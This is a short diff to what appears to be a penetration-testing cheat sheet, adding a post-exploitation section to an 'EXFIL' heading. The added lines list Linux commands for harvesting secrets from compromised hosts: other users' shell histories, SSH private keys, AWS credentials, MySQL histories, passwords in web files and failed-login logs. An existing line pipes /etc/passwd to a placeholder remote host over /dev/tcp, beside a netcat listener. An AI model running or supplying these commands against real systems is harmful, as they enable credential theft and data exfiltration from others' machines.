@@ -1,4 +1,17 @@
 ==## 7 - EXFIL ##==
 
+
+--# NIX #--
+#interesting stuff can be in many different places; examples:
+ps -efw #as arg
+last -f /var/log/btmp #pw in login prompt
+cat /home/*/.*history #as arg in shell
+grep -iR password /var/www #saved in web files
+cat /home/*/.ssh/id* #ssh keys
+cat /home/*/.mysql_history #history for db types
+cat /home/*/.aws/credentials
+
+
+--# EXFIL DATA #--
 cat /etc/passwd > dev/tcp/<ipaddr>/<port> #send contents of passwd file to system listening on <port>
 #nc -l -p <port> < file
